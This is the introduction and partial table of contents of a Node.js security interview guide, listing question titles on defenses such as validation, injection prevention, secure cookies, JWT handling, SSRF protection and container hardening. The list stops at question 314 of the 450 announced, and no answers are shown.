# Node.js Security Interview Questions and Answers

_Last updated: November 13, 2026_

This file has 450 interview questions about securing Node.js applications: 150 easy, 150 moderate and 150 advanced. The answers target Node.js 24 and 26 (both LTS lines), Express 5, the OWASP Top 10:2025 and current versions of common libraries such as Helmet, jose, argon2 and Zod. Code examples use ES modules unless noted.

## Table of Contents

- [Easy Questions (1-150)](#easy-questions-1-150)
- [Moderate Questions (151-300)](#moderate-questions-151-300)
- [Advanced Questions (301-450)](#advanced-questions-301-450)

### Easy Questions (1-150)

- [1: Why does Node.js security need its own attention compared to other back ends?](#1-why-does-nodejs-security-need-its-own-attention-compared-to-other-back-ends)
- [2: What is the OWASP Top 10?](#2-what-is-the-owasp-top-10)
- [3: What are the categories in the OWASP Top 10:2025?](#3-what-are-the-categories-in-the-owasp-top-102025)
- [4: What is the difference between authentication and authorization?](#4-what-is-the-difference-between-authentication-and-authorization)
- [5: What is input validation?](#5-what-is-input-validation)
- [6: What is the difference between validation and sanitization?](#6-what-is-the-difference-between-validation-and-sanitization)
- [7: Why should you prefer an allowlist over a denylist?](#7-why-should-you-prefer-an-allowlist-over-a-denylist)
- [8: How do you validate a request body in Express with Zod?](#8-how-do-you-validate-a-request-body-in-express-with-zod)
- [9: What is an injection attack?](#9-what-is-an-injection-attack)
- [10: What is SQL injection?](#10-what-is-sql-injection)
- [11: How do you prevent SQL injection in Node.js?](#11-how-do-you-prevent-sql-injection-in-nodejs)
- [12: What is NoSQL injection?](#12-what-is-nosql-injection)
- [13: What is command injection?](#13-what-is-command-injection)
- [14: What is XSS?](#14-what-is-xss)
- [15: What are the three main types of XSS?](#15-what-are-the-three-main-types-of-xss)
- [16: How do you prevent XSS on a Node.js server that renders HTML?](#16-how-do-you-prevent-xss-on-a-nodejs-server-that-renders-html)
- [17: What is CSRF?](#17-what-is-csrf)
- [18: How do you protect against CSRF?](#18-how-do-you-protect-against-csrf)
- [19: What is a session?](#19-what-is-a-session)
- [20: What is a JWT?](#20-what-is-a-jwt)
- [21: Should you put sensitive data inside a JWT payload?](#21-should-you-put-sensitive-data-inside-a-jwt-payload)
- [22: How do you sign and verify a JWT in Node.js?](#22-how-do-you-sign-and-verify-a-jwt-in-nodejs)
- [23: Why should you never store passwords in plain text?](#23-why-should-you-never-store-passwords-in-plain-text)
- [24: Why are MD5 and SHA-256 bad for storing passwords?](#24-why-are-md5-and-sha-256-bad-for-storing-passwords)
- [25: What is a salt?](#25-what-is-a-salt)
- [26: How do you hash a password with bcrypt?](#26-how-do-you-hash-a-password-with-bcrypt)
- [27: How do you hash a password with Argon2?](#27-how-do-you-hash-a-password-with-argon2)
- [28: Which password hashing algorithm does OWASP recommend first?](#28-which-password-hashing-algorithm-does-owasp-recommend-first)
- [29: What is RBAC?](#29-what-is-rbac)
- [30: What is ABAC?](#30-what-is-abac)
- [31: What is broken access control?](#31-what-is-broken-access-control)
- [32: What is IDOR?](#32-what-is-idor)
- [33: What is a cookie and why does its configuration matter for security?](#33-what-is-a-cookie-and-why-does-its-configuration-matter-for-security)
- [34: What does the HttpOnly cookie flag do?](#34-what-does-the-httponly-cookie-flag-do)
- [35: What does the Secure cookie flag do?](#35-what-does-the-secure-cookie-flag-do)
- [36: What does the SameSite cookie attribute do?](#36-what-does-the-samesite-cookie-attribute-do)
- [37: How do you set a secure cookie in Express?](#37-how-do-you-set-a-secure-cookie-in-express)
- [38: What are HTTP security headers?](#38-what-are-http-security-headers)
- [39: What is Helmet?](#39-what-is-helmet)
- [40: What is a Content Security Policy?](#40-what-is-a-content-security-policy)
- [41: What is HSTS?](#41-what-is-hsts)
- [42: What does X-Content-Type-Options: nosniff do?](#42-what-does-x-content-type-options-nosniff-do)
- [43: What is clickjacking and how do you prevent it?](#43-what-is-clickjacking-and-how-do-you-prevent-it)
- [44: What is CORS?](#44-what-is-cors)
- [45: Is CORS a security feature that protects your server?](#45-is-cors-a-security-feature-that-protects-your-server)
- [46: How do you configure CORS in Express?](#46-how-do-you-configure-cors-in-express)
- [47: What is rate limiting?](#47-what-is-rate-limiting)
- [48: How do you add rate limiting to an Express app?](#48-how-do-you-add-rate-limiting-to-an-express-app)
- [49: What is a brute-force attack?](#49-what-is-a-brute-force-attack)
- [50: What is credential stuffing?](#50-what-is-credential-stuffing)
- [51: What is ReDoS?](#51-what-is-redos)
- [52: Give an example of a regex that is vulnerable to ReDoS.](#52-give-an-example-of-a-regex-that-is-vulnerable-to-redos)
- [53: Why can one slow request take down a whole Node.js server?](#53-why-can-one-slow-request-take-down-a-whole-nodejs-server)
- [54: What is a denial-of-service (DoS) attack?](#54-what-is-a-denial-of-service-dos-attack)
- [55: What is prototype pollution?](#55-what-is-prototype-pollution)
- [56: Show a simple example of prototype pollution.](#56-show-a-simple-example-of-prototype-pollution)
- [57: What is path traversal?](#57-what-is-path-traversal)
- [58: What are the basic rules for secure file uploads?](#58-what-are-the-basic-rules-for-secure-file-uploads)
- [59: What is SSRF?](#59-what-is-ssrf)
- [60: What is insecure deserialization?](#60-what-is-insecure-deserialization)
- [61: Why is eval dangerous?](#61-why-is-eval-dangerous)
- [62: Is the node:vm module a security sandbox?](#62-is-the-nodevm-module-a-security-sandbox)
- [63: What is the difference between exec and execFile in child_process?](#63-what-is-the-difference-between-exec-and-execfile-in-child_process)
- [64: Where should secrets like API keys and DB passwords live?](#64-where-should-secrets-like-api-keys-and-db-passwords-live)
- [65: How do you load a .env file in modern Node.js without dotenv?](#65-how-do-you-load-a-env-file-in-modern-nodejs-without-dotenv)
- [66: Why should .env files never be committed?](#66-why-should-env-files-never-be-committed)
- [67: What is the node:crypto module used for?](#67-what-is-the-nodecrypto-module-used-for)
- [68: Why is Math.random() not safe for tokens?](#68-why-is-mathrandom-not-safe-for-tokens)
- [69: What is the difference between hashing and encryption?](#69-what-is-the-difference-between-hashing-and-encryption)
- [70: What is HMAC?](#70-what-is-hmac)
- [71: What is a timing attack?](#71-what-is-a-timing-attack)
- [72: How do you compare secrets safely in Node.js?](#72-how-do-you-compare-secrets-safely-in-nodejs)
- [73: Why does a Node.js app need HTTPS?](#73-why-does-a-nodejs-app-need-https)
- [74: Do you usually terminate TLS inside Node.js?](#74-do-you-usually-terminate-tls-inside-nodejs)
- [75: What does npm audit do?](#75-what-does-npm-audit-do)
- [76: What is a lockfile and why does it matter for security?](#76-what-is-a-lockfile-and-why-does-it-matter-for-security)
- [77: What is the difference between npm install and npm ci?](#77-what-is-the-difference-between-npm-install-and-npm-ci)
- [78: What is typosquatting?](#78-what-is-typosquatting)
- [79: What are npm install scripts and why are they risky?](#79-what-are-npm-install-scripts-and-why-are-they-risky)
- [80: What is an SBOM?](#80-what-is-an-sbom)
- [81: What is the Node.js permission model?](#81-what-is-the-nodejs-permission-model)
- [82: What happens when code tries to do something the permission model does not allow?](#82-what-happens-when-code-tries-to-do-something-the-permission-model-does-not-allow)
- [83: Why should error messages not show stack traces to users?](#83-why-should-error-messages-not-show-stack-traces-to-users)
- [84: What should you never write to logs?](#84-what-should-you-never-write-to-logs)
- [85: How do you hide sensitive fields in logs with pino?](#85-how-do-you-hide-sensitive-fields-in-logs-with-pino)
- [86: What is security logging and monitoring?](#86-what-is-security-logging-and-monitoring)
- [87: What is a WebSocket and why does it need its own security checks?](#87-what-is-a-websocket-and-why-does-it-need-its-own-security-checks)
- [88: What is GraphQL introspection and should it be on in production?](#88-what-is-graphql-introspection-and-should-it-be-on-in-production)
- [89: Why should a Node.js container not run as root?](#89-why-should-a-nodejs-container-not-run-as-root)
- [90: Why should you use a small base image for Node.js containers?](#90-why-should-you-use-a-small-base-image-for-nodejs-containers)
- [91: What is SAST?](#91-what-is-sast)
- [92: What is DAST?](#92-what-is-dast)
- [93: What is fuzzing?](#93-what-is-fuzzing)
- [94: What is a CVE?](#94-what-is-a-cve)
- [95: What is a security release in Node.js?](#95-what-is-a-security-release-in-nodejs)
- [96: Why should you only use supported Node.js versions in production?](#96-why-should-you-only-use-supported-nodejs-versions-in-production)
- [97: What does the principle of least privilege mean?](#97-what-does-the-principle-of-least-privilege-mean)
- [98: What is defense in depth?](#98-what-is-defense-in-depth)
- [99: What is the difference between 401 and 403?](#99-what-is-the-difference-between-401-and-403)
- [100: What does the X-Powered-By header reveal and why remove it?](#100-what-does-the-x-powered-by-header-reveal-and-why-remove-it)
- [101: What is OAuth 2.0?](#101-what-is-oauth-20)
- [102: What is OpenID Connect?](#102-what-is-openid-connect)
- [103: What is the difference between an access token and a refresh token?](#103-what-is-the-difference-between-an-access-token-and-a-refresh-token)
- [104: What is multi-factor authentication?](#104-what-is-multi-factor-authentication)
- [105: What are passkeys?](#105-what-are-passkeys)
- [106: What is LDAP injection?](#106-what-is-ldap-injection)
- [107: Why should you limit the size of request bodies?](#107-why-should-you-limit-the-size-of-request-bodies)
- [108: What does app.set('trust proxy') do in Express and why does it matter for security?](#108-what-does-appsettrust-proxy-do-in-express-and-why-does-it-matter-for-security)
- [109: What is an open redirect?](#109-what-is-an-open-redirect)
- [110: What is mass assignment?](#110-what-is-mass-assignment)
- [111: What is account enumeration?](#111-what-is-account-enumeration)
- [112: How should a password reset token be created?](#112-how-should-a-password-reset-token-be-created)
- [113: Why should logout destroy the session on the server?](#113-why-should-logout-destroy-the-session-on-the-server)
- [114: What is session fixation?](#114-what-is-session-fixation)
- [115: What does NODE_ENV=production change that affects security?](#115-what-does-node_envproduction-change-that-affects-security)
- [116: Why is exposing the Node.js inspector port dangerous?](#116-why-is-exposing-the-nodejs-inspector-port-dangerous)
- [117: What is a referrer policy?](#117-what-is-a-referrer-policy)
- [118: What is the Permissions-Policy header?](#118-what-is-the-permissions-policy-header)
- [119: How do you sanitize user-supplied HTML in Node.js?](#119-how-do-you-sanitize-user-supplied-html-in-nodejs)
- [120: What is server-side template injection?](#120-what-is-server-side-template-injection)
- [121: How does express.static handle dotfiles?](#121-how-does-expressstatic-handle-dotfiles)
- [122: Why should you not ship source maps publicly from a Node.js-built front end?](#122-why-should-you-not-ship-source-maps-publicly-from-a-nodejs-built-front-end)
- [123: What is NODE_TLS_REJECT_UNAUTHORIZED=0 and why is it dangerous?](#123-what-is-node_tls_reject_unauthorized0-and-why-is-it-dangerous)
- [124: What is Subresource Integrity?](#124-what-is-subresource-integrity)
- [125: Why should you avoid JSONP?](#125-why-should-you-avoid-jsonp)
- [126: What is a threat model?](#126-what-is-a-threat-model)
- [127: What is the purpose of a SECURITY.md file?](#127-what-is-the-purpose-of-a-securitymd-file)
- [128: What is responsible disclosure?](#128-what-is-responsible-disclosure)
- [129: Why should you keep dependencies updated?](#129-why-should-you-keep-dependencies-updated)
- [130: What is Dependabot?](#130-what-is-dependabot)
- [131: What is a webhook signature and why verify it?](#131-what-is-a-webhook-signature-and-why-verify-it)
- [132: Why do you need the raw body to verify a webhook signature?](#132-why-do-you-need-the-raw-body-to-verify-a-webhook-signature)
- [133: What is an API key and how should it be stored on the server?](#133-what-is-an-api-key-and-how-should-it-be-stored-on-the-server)
- [134: What does "fail securely" mean?](#134-what-does-fail-securely-mean)
- [135: What happens to an unhandled promise rejection in modern Node.js?](#135-what-happens-to-an-unhandled-promise-rejection-in-modern-nodejs)
- [136: Should you keep the process running after an uncaughtException?](#136-should-you-keep-the-process-running-after-an-uncaughtexception)
- [137: How do you add HTTP request timeouts in a Node.js server?](#137-how-do-you-add-http-request-timeouts-in-a-nodejs-server)
- [138: What is a Slowloris attack?](#138-what-is-a-slowloris-attack)
- [139: Why should health and debug endpoints be protected?](#139-why-should-health-and-debug-endpoints-be-protected)
- [140: What is two-factor authentication on the npm registry and why use it?](#140-what-is-two-factor-authentication-on-the-npm-registry-and-why-use-it)
- [141: What is npm provenance?](#141-what-is-npm-provenance)
- [142: What is the risk of putting an npm token in .npmrc in a repo?](#142-what-is-the-risk-of-putting-an-npm-token-in-npmrc-in-a-repo)
- [143: What is a CAPTCHA and when should you use it?](#143-what-is-a-captcha-and-when-should-you-use-it)
- [144: How should user IDs be generated in public URLs?](#144-how-should-user-ids-be-generated-in-public-urls)
- [145: What is the same-origin policy?](#145-what-is-the-same-origin-policy)
- [146: What is HTTPS redirection and how do you do it behind a proxy?](#146-what-is-https-redirection-and-how-do-you-do-it-behind-a-proxy)
- [147: What are security misconfigurations in a typical Node.js app?](#147-what-are-security-misconfigurations-in-a-typical-nodejs-app)
- [148: Why should the session secret be long and random?](#148-why-should-the-session-secret-be-long-and-random)
- [149: What is an incident response plan?](#149-what-is-an-incident-response-plan)
- [150: What should you do first if a secret is leaked in a public repo?](#150-what-should-you-do-first-if-a-secret-is-leaked-in-a-public-repo)

### Moderate Questions (151-300)

- [151: How do you write a reusable validation middleware for Express with Zod?](#151-how-do-you-write-a-reusable-validation-middleware-for-express-with-zod)
- [152: Why do query string values need type coercion during validation?](#152-why-do-query-string-values-need-type-coercion-during-validation)
- [153: How did Express 5's query parser change help against NoSQL injection?](#153-how-did-express-5s-query-parser-change-help-against-nosql-injection)
- [154: How do you protect Mongoose queries from operator injection?](#154-how-do-you-protect-mongoose-queries-from-operator-injection)
- [155: Why does express-mongo-sanitize not work well with Express 5?](#155-why-does-express-mongo-sanitize-not-work-well-with-express-5)
- [156: How do you safely use dynamic column names or sort order in SQL?](#156-how-do-you-safely-use-dynamic-column-names-or-sort-order-in-sql)
- [157: What is the difference between $queryRaw and $queryRawUnsafe in Prisma?](#157-what-is-the-difference-between-queryraw-and-queryrawunsafe-in-prisma)
- [158: How do you use raw SQL safely in Knex?](#158-how-do-you-use-raw-sql-safely-in-knex)
- [159: What is second-order SQL injection?](#159-what-is-second-order-sql-injection)
- [160: Why do LIKE queries need extra escaping even with parameters?](#160-why-do-like-queries-need-extra-escaping-even-with-parameters)
- [161: What is argument injection in child_process calls?](#161-what-is-argument-injection-in-child_process-calls)
- [162: What changed about spawn with shell: true in recent Node.js versions?](#162-what-changed-about-spawn-with-shell-true-in-recent-nodejs-versions)
- [163: How do you set up a CSP with nonces in Express?](#163-how-do-you-set-up-a-csp-with-nonces-in-express)
- [164: What is Content-Security-Policy-Report-Only used for?](#164-what-is-content-security-policy-report-only-used-for)
- [165: How do you receive CSP violation reports in Node.js?](#165-how-do-you-receive-csp-violation-reports-in-nodejs)
- [166: Which headers does Helmet set by default?](#166-which-headers-does-helmet-set-by-default)
- [167: Why does Helmet set X-XSS-Protection to 0?](#167-why-does-helmet-set-x-xss-protection-to-0)
- [168: What is HSTS preload and what should you check before enabling it?](#168-what-is-hsts-preload-and-what-should-you-check-before-enabling-it)
- [169: What are the __Host- and __Secure- cookie prefixes?](#169-what-are-the-__host--and-__secure--cookie-prefixes)
- [170: How do you configure express-session for production?](#170-how-do-you-configure-express-session-for-production)
- [171: How do you prevent session fixation in Express?](#171-how-do-you-prevent-session-fixation-in-express)
- [172: What is the difference between idle timeout and absolute timeout for sessions?](#172-what-is-the-difference-between-idle-timeout-and-absolute-timeout-for-sessions)
- [173: Where should a browser app store JWTs: localStorage or cookies?](#173-where-should-a-browser-app-store-jwts-localstorage-or-cookies)
- [174: What is the "alg: none" JWT attack and how do you prevent it?](#174-what-is-the-alg-none-jwt-attack-and-how-do-you-prevent-it)
- [175: Which claims should you check when verifying a JWT?](#175-which-claims-should-you-check-when-verifying-a-jwt)
- [176: How can you revoke JWTs before they expire?](#176-how-can-you-revoke-jwts-before-they-expire)
- [177: What is refresh token rotation?](#177-what-is-refresh-token-rotation)
- [178: What is PKCE and why is it required now?](#178-what-is-pkce-and-why-is-it-required-now)
- [179: How do you implement an OIDC login with openid-client in Node.js?](#179-how-do-you-implement-an-oidc-login-with-openid-client-in-nodejs)
- [180: What are the state and nonce parameters in OAuth and OIDC for?](#180-what-are-the-state-and-nonce-parameters-in-oauth-and-oidc-for)
- [181: What is the backend-for-frontend (BFF) pattern for auth?](#181-what-is-the-backend-for-frontend-bff-pattern-for-auth)
- [182: Why is the csurf package no longer recommended?](#182-why-is-the-csurf-package-no-longer-recommended)
- [183: What is the double-submit cookie pattern for CSRF?](#183-what-is-the-double-submit-cookie-pattern-for-csrf)
- [184: How do you use Fetch Metadata headers to block cross-site requests?](#184-how-do-you-use-fetch-metadata-headers-to-block-cross-site-requests)
- [185: How do you configure CORS with a dynamic list of origins?](#185-how-do-you-configure-cors-with-a-dynamic-list-of-origins)
- [186: What is a CORS preflight request?](#186-what-is-a-cors-preflight-request)
- [187: Why should you never allow the "null" origin in CORS?](#187-why-should-you-never-allow-the-null-origin-in-cors)
- [188: Why is reflecting the request Origin with credentials dangerous?](#188-why-is-reflecting-the-request-origin-with-credentials-dangerous)
- [189: How should rate limiting on a login endpoint work?](#189-how-should-rate-limiting-on-a-login-endpoint-work)
- [190: How do you share rate limit counters across several Node.js instances?](#190-how-do-you-share-rate-limit-counters-across-several-nodejs-instances)
- [191: What is the difference between rate limiting and slowing down requests?](#191-what-is-the-difference-between-rate-limiting-and-slowing-down-requests)
- [192: What are the risks of account lockout as a brute-force defense?](#192-what-are-the-risks-of-account-lockout-as-a-brute-force-defense)
- [193: What settings should you use for Argon2id in Node.js?](#193-what-settings-should-you-use-for-argon2id-in-nodejs)
- [194: What is bcrypt's 72-byte limit and why does it matter?](#194-what-is-bcrypts-72-byte-limit-and-why-does-it-matter)
- [195: How do you upgrade password hashes when you change the algorithm or cost?](#195-how-do-you-upgrade-password-hashes-when-you-change-the-algorithm-or-cost)
- [196: What is a pepper in password hashing?](#196-what-is-a-pepper-in-password-hashing)
- [197: How do you hash a password with scrypt from node:crypto?](#197-how-do-you-hash-a-password-with-scrypt-from-nodecrypto)
- [198: How do you write an RBAC middleware in Express?](#198-how-do-you-write-an-rbac-middleware-in-express)
- [199: Why is checking the role not enough for many endpoints?](#199-why-is-checking-the-role-not-enough-for-many-endpoints)
- [200: What is CASL and when would you use it?](#200-what-is-casl-and-when-would-you-use-it)
- [201: How do you configure multer safely for file uploads?](#201-how-do-you-configure-multer-safely-for-file-uploads)
- [202: How do you check the real type of an uploaded file?](#202-how-do-you-check-the-real-type-of-an-uploaded-file)
- [203: How do you safely build a file path from user input?](#203-how-do-you-safely-build-a-file-path-from-user-input)
- [204: Why might a path check still fail because of symlinks?](#204-why-might-a-path-check-still-fail-because-of-symlinks)
- [205: How do you serve user-uploaded files safely for download?](#205-how-do-you-serve-user-uploaded-files-safely-for-download)
- [206: What is Zip Slip?](#206-what-is-zip-slip)
- [207: What is a decompression bomb and how do you defend against it?](#207-what-is-a-decompression-bomb-and-how-do-you-defend-against-it)
- [208: How do you check a user-supplied URL before fetching it, to prevent SSRF?](#208-how-do-you-check-a-user-supplied-url-before-fetching-it-to-prevent-ssrf)
- [209: How do you block private IP ranges with net.BlockList?](#209-how-do-you-block-private-ip-ranges-with-netblocklist)
- [210: Why are HTTP redirects a problem for SSRF protection?](#210-why-are-http-redirects-a-problem-for-ssrf-protection)
- [211: Why are cloud metadata endpoints a key SSRF target?](#211-why-are-cloud-metadata-endpoints-a-key-ssrf-target)
- [212: How do you prevent prototype pollution in your own code?](#212-how-do-you-prevent-prototype-pollution-in-your-own-code)
- [213: What does the --disable-proto flag do?](#213-what-does-the---disable-proto-flag-do)
- [214: Does JSON.parse pollute the prototype when the input has a proto key?](#214-does-jsonparse-pollute-the-prototype-when-the-input-has-a-proto-key)
- [215: Why can freezing Object.prototype help, and what is the downside?](#215-why-can-freezing-objectprototype-help-and-what-is-the-downside)
- [216: How do you find ReDoS problems in your regexes?](#216-how-do-you-find-redos-problems-in-your-regexes)
- [217: How does the re2 package protect against ReDoS?](#217-how-does-the-re2-package-protect-against-redos)
- [218: Why should you limit input length before running a regex?](#218-why-should-you-limit-input-length-before-running-a-regex)
- [219: How do you measure event loop blocking in production?](#219-how-do-you-measure-event-loop-blocking-in-production)
- [220: How do you keep CPU-heavy work from blocking the event loop?](#220-how-do-you-keep-cpu-heavy-work-from-blocking-the-event-loop)
- [221: What is load shedding and how do you do it in Node.js?](#221-what-is-load-shedding-and-how-do-you-do-it-in-nodejs)
- [222: Why can JSON.parse be a DoS vector?](#222-why-can-jsonparse-be-a-dos-vector)
- [223: How do you parse YAML from users safely in Node.js?](#223-how-do-you-parse-yaml-from-users-safely-in-nodejs)
- [224: Why should you not use v8.deserialize on untrusted data?](#224-why-should-you-not-use-v8deserialize-on-untrusted-data)
- [225: How can you replace eval in common use cases?](#225-how-can-you-replace-eval-in-common-use-cases)
- [226: What does --disallow-code-generation-from-strings do?](#226-what-does---disallow-code-generation-from-strings-do)
- [227: How should you run untrusted user code in a Node.js service?](#227-how-should-you-run-untrusted-user-code-in-a-nodejs-service)
- [228: How do you load secrets from a secrets manager at startup?](#228-how-do-you-load-secrets-from-a-secrets-manager-at-startup)
- [229: What are the downsides of keeping secrets in environment variables?](#229-what-are-the-downsides-of-keeping-secrets-in-environment-variables)
- [230: How do you stop secrets from being committed in the first place?](#230-how-do-you-stop-secrets-from-being-committed-in-the-first-place)
- [231: How do you rotate a secret without downtime?](#231-how-do-you-rotate-a-secret-without-downtime)
- [232: How do you encrypt data with AES-256-GCM in Node.js?](#232-how-do-you-encrypt-data-with-aes-256-gcm-in-nodejs)
- [233: Why must you never reuse an IV with the same key in AES-GCM?](#233-why-must-you-never-reuse-an-iv-with-the-same-key-in-aes-gcm)
- [234: What is the difference between createCipher and createCipheriv?](#234-what-is-the-difference-between-createcipher-and-createcipheriv)
- [235: What is HKDF and when would you use it?](#235-what-is-hkdf-and-when-would-you-use-it)
- [236: What is crypto.hash and when should you use it?](#236-what-is-cryptohash-and-when-should-you-use-it)
- [237: How do you generate a secure random number in a range?](#237-how-do-you-generate-a-secure-random-number-in-a-range)
- [238: How do you sign and verify data with Ed25519 in Node.js?](#238-how-do-you-sign-and-verify-data-with-ed25519-in-nodejs)
- [239: What is the Web Crypto API in Node.js and why use it?](#239-what-is-the-web-crypto-api-in-nodejs-and-why-use-it)
- [240: How do you start an HTTPS server in Node.js with modern TLS settings?](#240-how-do-you-start-an-https-server-in-nodejs-with-modern-tls-settings)
- [241: How do you trust a private or corporate CA in Node.js?](#241-how-do-you-trust-a-private-or-corporate-ca-in-nodejs)
- [242: What is mutual TLS and when would you use it between services?](#242-what-is-mutual-tls-and-when-would-you-use-it-between-services)
- [243: How do you install dependencies without running install scripts?](#243-how-do-you-install-dependencies-without-running-install-scripts)
- [244: What does npm audit signatures check?](#244-what-does-npm-audit-signatures-check)
- [245: How do you fix a vulnerable transitive dependency you do not control?](#245-how-do-you-fix-a-vulnerable-transitive-dependency-you-do-not-control)
- [246: What do you check before adding a new npm package?](#246-what-do-you-check-before-adding-a-new-npm-package)
- [247: What is a minimum release age for dependencies and why use it?](#247-what-is-a-minimum-release-age-for-dependencies-and-why-use-it)
- [248: Why should CI and production use the same lockfile and npm ci?](#248-why-should-ci-and-production-use-the-same-lockfile-and-npm-ci)
- [249: How do you use the permission model to limit file access to specific folders?](#249-how-do-you-use-the-permission-model-to-limit-file-access-to-specific-folders)
- [250: What does the Node.js permission model not protect against?](#250-what-does-the-nodejs-permission-model-not-protect-against)
- [251: Which security events should a Node.js app log?](#251-which-security-events-should-a-nodejs-app-log)
- [252: What is a correlation ID and why is it useful for security?](#252-what-is-a-correlation-id-and-why-is-it-useful-for-security)
- [253: How do you write an Express error handler that does not leak details?](#253-how-do-you-write-an-express-error-handler-that-does-not-leak-details)
- [254: Why are raw database errors dangerous to return to clients?](#254-why-are-raw-database-errors-dangerous-to-return-to-clients)
- [255: How do you make audit logs harder to tamper with?](#255-how-do-you-make-audit-logs-harder-to-tamper-with)
- [256: What should trigger a security alert, not just a log line?](#256-what-should-trigger-a-security-alert-not-just-a-log-line)
- [257: How do you stop error trackers like Sentry from collecting secrets?](#257-how-do-you-stop-error-trackers-like-sentry-from-collecting-secrets)
- [258: What HTTP parser limits does Node.js have and how do you change them?](#258-what-http-parser-limits-does-nodejs-have-and-how-do-you-change-them)
- [259: What is the insecureHTTPParser option and why should it stay off?](#259-what-is-the-insecurehttpparser-option-and-why-should-it-stay-off)
- [260: What is a Host header attack?](#260-what-is-a-host-header-attack)
- [261: Can an attacker inject headers through res.setHeader in Node.js?](#261-can-an-attacker-inject-headers-through-ressetheader-in-nodejs)
- [262: How do you authenticate WebSocket connections with the ws library?](#262-how-do-you-authenticate-websocket-connections-with-the-ws-library)
- [263: What is cross-site WebSocket hijacking?](#263-what-is-cross-site-websocket-hijacking)
- [264: Why should you lower the ws maxPayload setting?](#264-why-should-you-lower-the-ws-maxpayload-setting)
- [265: How do you rate limit WebSocket messages?](#265-how-do-you-rate-limit-websocket-messages)
- [266: How do you secure Socket.IO connections?](#266-how-do-you-secure-socketio-connections)
- [267: What is a GraphQL depth attack and how do you stop it?](#267-what-is-a-graphql-depth-attack-and-how-do-you-stop-it)
- [268: What is query cost analysis in GraphQL?](#268-what-is-query-cost-analysis-in-graphql)
- [269: What are GraphQL alias and batching attacks?](#269-what-are-graphql-alias-and-batching-attacks)
- [270: Where should authorization happen in a GraphQL API?](#270-where-should-authorization-happen-in-a-graphql-api)
- [271: What are persisted queries and how do they help security?](#271-what-are-persisted-queries-and-how-do-they-help-security)
- [272: What does Apollo Server's csrfPrevention option do?](#272-what-does-apollo-servers-csrfprevention-option-do)
- [273: How do you stop GraphQL errors from leaking internal details?](#273-how-do-you-stop-graphql-errors-from-leaking-internal-details)
- [274: What does a secure multi-stage Dockerfile for Node.js look like?](#274-what-does-a-secure-multi-stage-dockerfile-for-nodejs-look-like)
- [275: What are distroless images and what is the trade-off?](#275-what-are-distroless-images-and-what-is-the-trade-off)
- [276: How do you pass secrets into a Docker build without leaking them into image layers?](#276-how-do-you-pass-secrets-into-a-docker-build-without-leaking-them-into-image-layers)
- [277: Why do you need a .dockerignore file?](#277-why-do-you-need-a-dockerignore-file)
- [278: How do you scan container images for vulnerabilities?](#278-how-do-you-scan-container-images-for-vulnerabilities)
- [279: What Kubernetes securityContext settings should a Node.js pod use?](#279-what-kubernetes-securitycontext-settings-should-a-nodejs-pod-use)
- [280: Why should Node.js not be PID 1 in a container without care?](#280-why-should-nodejs-not-be-pid-1-in-a-container-without-care)
- [281: How do you write a simple Semgrep rule for a Node.js security pattern?](#281-how-do-you-write-a-simple-semgrep-rule-for-a-nodejs-security-pattern)
- [282: What does eslint-plugin-security catch?](#282-what-does-eslint-plugin-security-catch)
- [283: How do you run CodeQL on a Node.js repo?](#283-how-do-you-run-codeql-on-a-nodejs-repo)
- [284: How do you add a DAST scan with ZAP to CI?](#284-how-do-you-add-a-dast-scan-with-zap-to-ci)
- [285: How can property-based testing help find security bugs?](#285-how-can-property-based-testing-help-find-security-bugs)
- [286: Why should authorization rules have their own automated tests?](#286-why-should-authorization-rules-have-their-own-automated-tests)
- [287: How do you check if your Node.js version has known vulnerabilities?](#287-how-do-you-check-if-your-nodejs-version-has-known-vulnerabilities)
- [288: How do you stay informed about Node.js security releases?](#288-how-do-you-stay-informed-about-nodejs-security-releases)
- [289: How do you harden GitHub Actions workflows for a Node.js project?](#289-how-do-you-harden-github-actions-workflows-for-a-nodejs-project)
- [290: Why is pull_request_target dangerous?](#290-why-is-pull_request_target-dangerous)
- [291: Which security-related changes came with Express 5?](#291-which-security-related-changes-came-with-express-5)
- [292: What security features does Fastify give you by default?](#292-what-security-features-does-fastify-give-you-by-default)
- [293: How does NestJS's ValidationPipe help with mass assignment?](#293-how-does-nestjss-validationpipe-help-with-mass-assignment)
- [294: What is HTTP parameter pollution?](#294-what-is-http-parameter-pollution)
- [295: Why should a JSON API check the request Content-Type?](#295-why-should-a-json-api-check-the-request-content-type)
- [296: Why does Unicode normalization matter for security checks?](#296-why-does-unicode-normalization-matter-for-security-checks)
- [297: How do signed cookies work in Express?](#297-how-do-signed-cookies-work-in-express)
- [298: What is the OWASP ASVS and how is it different from the Top 10?](#298-what-is-the-owasp-asvs-and-how-is-it-different-from-the-top-10)
- [299: How do you handle security fixes for a dependency with no patch available?](#299-how-do-you-handle-security-fixes-for-a-dependency-with-no-patch-available)
- [300: What is a security champion in a dev team?](#300-what-is-a-security-champion-in-a-dev-team)

### Advanced Questions (301-450)

- [301: What does the Node.js threat model say Node.js trusts?](#301-what-does-the-nodejs-threat-model-say-nodejs-trusts)
- [302: How does HTTP request smuggling work?](#302-how-does-http-request-smuggling-work)
- [303: How does Node.js defend against request smuggling, and what is left to you?](#303-how-does-nodejs-defend-against-request-smuggling-and-what-is-left-to-you)
- [304: What was the HTTP/2 Rapid Reset attack and how did Node.js respond?](#304-what-was-the-http2-rapid-reset-attack-and-how-did-nodejs-respond)
- [305: Which options limit resource use on a Node.js HTTP/2 server?](#305-which-options-limit-resource-use-on-a-nodejs-http2-server)
- [306: How can prototype pollution lead to remote code execution in Node.js?](#306-how-can-prototype-pollution-lead-to-remote-code-execution-in-nodejs)
- [307: Has Node.js core done anything about prototype pollution gadgets?](#307-has-nodejs-core-done-anything-about-prototype-pollution-gadgets)
- [308: How do you detect prototype pollution at runtime?](#308-how-do-you-detect-prototype-pollution-at-runtime)
- [309: How would you fix a deep-merge function to be safe against pollution?](#309-how-would-you-fix-a-deep-merge-function-to-be-safe-against-pollution)
- [310: How can you run a regex with a time limit in Node.js?](#310-how-can-you-run-a-regex-with-a-time-limit-in-nodejs)
- [311: What is V8's experimental non-backtracking regex engine?](#311-what-is-v8s-experimental-non-backtracking-regex-engine)
- [312: What is hash flooding and is Node.js exposed to it?](#312-what-is-hash-flooding-and-is-nodejs-exposed-to-it)
- [313: How do memory limits interact between Node.js and containers?](#313-how-do-memory-limits-interact-between-nodejs-and-containers)
- [314: What is DNS rebinding and why does it break simple SSRF checks?](#314-what-is-dns-rebinding-and-why-does-it-break-simple-ssrf-checks)
